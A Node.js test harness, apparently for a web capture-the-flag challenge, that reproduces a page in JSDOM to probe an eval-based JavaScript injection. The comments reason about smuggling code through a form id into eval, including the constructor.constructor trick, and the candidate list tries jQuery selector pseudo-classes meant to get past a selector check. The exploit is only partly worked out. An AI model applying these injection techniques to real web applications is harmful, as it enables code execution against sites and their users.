const fs = require("fs");
const { JSDOM } = require("jsdom");
const jquerySrc = fs.readFileSync(__dirname + "/node_modules/jquery/dist/jquery.js", "utf8");

function test(format, note) {
  const html = `<!DOCTYPE html><html><body>
  <form id="poly_x" data-formula="x+y">
    <input id="x_standard" name="x" value="1"><input id="y_standard" name="y" value="2">
    <input name="formula" value="x+y"><div id="template_standard" hidden>t</div>
  </form><pre id="answer"></pre></body></html>`;
  const dom = new JSDOM(html, { runScripts: "dangerously", pretendToBeVisual: true, url:"https://polynomial.secso.cc/" });
  const { window } = dom;
  const s = window.document.createElement("script"); s.textContent = jquerySrc; window.document.head.appendChild(s);
  const $ = window.$;
  const form = window.document.querySelector("form");
  form.id = "poly_" + format;
  const selected = form.id.replace("poly_", "");
  let res = { note, selLen:null, hit:false };
  try {
    const t = $("#template_" + selected);
    res.selLen = t.length;
    if (t.length === 0) {
      window.__HIT__ = false;
      window.type_standard = function(){ return "SAFE"; };
      try {
        window.eval("(function(){ var selected=" + JSON.stringify(selected) + "; " +
                    "return eval('type_'+selected+'(this, selected)'); }).call(document.querySelector('form'))");
        res.hit = !!window.__HIT__;
      } catch(e){ res.evalErr = e.message.split("\n")[0]; }
    } else { res.note += " [SAFE PATH]"; }
  } catch(e){ res.selErr = e.message.split("\n")[0]; }
  return res;
}

// The eval is: type_<format>(this, selected)  -- parens+args are FREE.
// selected === format (the whole string). So we can smuggle JS in `selected` as the Function body.
// type_standard.constructor.constructor === Function.  Function(this, selected) builds fn but doesn't call.
// We need it CALLED. Idea: use .constructor.constructor and rely on the arg being run?  No.
// Alternative: make type_<format> resolve to something whose call with (this,selected) RUNS selected.
// e.g. window.eval? -> type_standard.ownerDocument... no.
// Try: format = "standard.constructor.constructor" and set __HIT__ via body? body not executed.
//
// Different: selector allows `:` pseudos w/ parens. Does jQuery accept #template_x:not(y)? test.
const cands = [
  ["standard.constructor.constructor", "Function ctor (builds, not calls)"],
  ["x:not(y)", ":not pseudo valid?"],
  ["x:has(y)", ":has pseudo valid?"],
  ["x:nth-child(1)", ":nth-child valid?"],
  ["standard:not(a)", "type_standard:not(a)(...) JS?"],
];
for (const [c,n] of cands) console.log(JSON.stringify(test(c,n)));
